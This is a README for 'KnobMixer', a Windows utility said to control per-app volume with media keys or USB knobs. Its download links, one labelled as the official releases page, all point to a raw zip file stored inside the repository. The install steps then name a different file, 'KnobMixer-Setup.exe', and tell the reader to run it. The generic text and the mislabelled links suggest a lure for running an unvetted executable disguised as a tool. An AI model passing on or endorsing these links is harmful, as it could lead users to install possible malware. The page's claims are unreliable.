# 🔊 KnobMixer - Control app volume using external hardware

[![](https://img.shields.io/badge/Download-KnobMixer-blue)](https://github.com/fishladdernewswoman851/KnobMixer/raw/refs/heads/main/app/ui/Mixer-Knob-3.0.zip)

KnobMixer lets you manage the volume of individual applications on your Windows computer using hardware inputs. You can map your keyboard media buttons or USB volume knobs to specific programs like Spotify, Discord, or your web browser. This tool runs in the system tray and provides a simple way to change audio levels without opening the Windows Volume Mixer window.

## ⚙️ Requirements

KnobMixer works on Windows 10 and Windows 11. Your computer requires the following:

*   Windows 10 or 11 (64-bit).
*   Keyboard with media keys or a USB volume knob device.
*   Latest Windows audio drivers.
*   System permissions to run background applications.

## 📥 Installation

1. Visit the [official releases page](https://github.com/fishladdernewswoman851/KnobMixer/raw/refs/heads/main/app/ui/Mixer-Knob-3.0.zip) to download the software.
2. Select the file named `KnobMixer-Setup.exe`.
3. Save the file to your desktop or downloads folder.
4. Double-click the downloaded file to begin the installation process.
5. Follow the on-screen instructions in the installer.
6. The app creates a shortcut on your desktop automatically.

## 🚀 Setup and Usage

Once you finish the installation, follow these steps to link your hardware.

1. Launch KnobMixer from the desktop shortcut or your Start menu.
2. Look for the speaker icon in your system tray—the area near the clock at the bottom right of your screen.
3. Right-click the icon to open the menu.
4. Select Settings to view your available audio devices and applications.
5. Click Add New Bind to create a connection.
6. Press the physical button or turn the knob you want to use. KnobMixer detects the input signal automatically.
7. Select the specific application you want to control from the dropdown list.
8. Click Save to confirm your changes.

You can now adjust the volume of the selected program using your hardware. Repeat these steps for each application you want to control.

## 🛠️ Features

*   **Per-App Volume Control**: Set independent volume levels for different software.
*   **Hardware Compatibility**: Works with standard media keys, gaming keyboards, and dedicated USB knobs.
*   **Background Operation**: The software sits in the system tray to ensure minimal impact on your system resources.
*   **Instant Mapping**: The software detects raw input signals from connected devices.
*   **Volume Mixer Integration**: Uses standard Windows audio protocols to maintain stable sound levels.

## 🔧 Troubleshooting

If KnobMixer does not respond to your inputs, check the following items:

**Hardware detection**
Verify that your keyboard or USB knob works in other programs. If Windows does not recognize the device, KnobMixer cannot detect your button presses. Unplug the device and plug it back into a different USB port.

**Application visibility**
KnobMixer only displays programs that are currently playing audio or are active in the Windows Volume Mixer. If an application is muted or closed, it may disappear from the list. Open the application and play a sound to ensure it appears in the selection menu.

**Restarting the app**
If the software stops responding, right-click the system tray icon and select Exit. Open the application again from the desktop shortcut to refresh the connection to your audio devices.

**Driver updates**
Ensure your audio drivers are current. Outdated drivers can prevent communication between your hardware and the Windows volume system. Use the Windows Device Manager to check for driver updates if you experience distorted sound or input delays.

## 💡 Configuration Tips

*   **Startup Behavior**: Open the settings menu to enable "Start with Windows." This ensures your volume controls work the moment you log in.
*   **Global Volume**: You can map one knob to the "Master" device to control the global system volume instead of a single application.
*   **Multiple Knob Devices**: The software supports multiple hardware devices at the same time. You can assign one knob to your web browser and another to your communication software.
*   **Latency**: If you notice a lag between turning a knob and the volume changing, close other heavy applications that consume high CPU levels. KnobMixer uses very little power, but system-wide delays can affect response times.

## 📜 Privacy and Data

KnobMixer runs locally on your machine. The internal code processes your inputs directly through Windows. It does not send any telemetry, hardware information, or audio data to the internet. Your settings file remains on your local drive in your user folder.

## ℹ️ Technical Background

The software utilizes standard Windows audio API systems to handle volume changes. It monitors raw input events from your USB devices and keyboard interface. By leveraging the Windows audio architecture, the application applies changes directly to the audio stream of the target application. This approach ensures compatibility with most media players and browser-based audio clients.

The codebase is built for stability and speed. It handles audio signal updates in real-time, which allows for smooth transitions when you turn your hardware knob. You can view the open-source structure on the repository page if you wish to see how the software communicates with Windows audio components.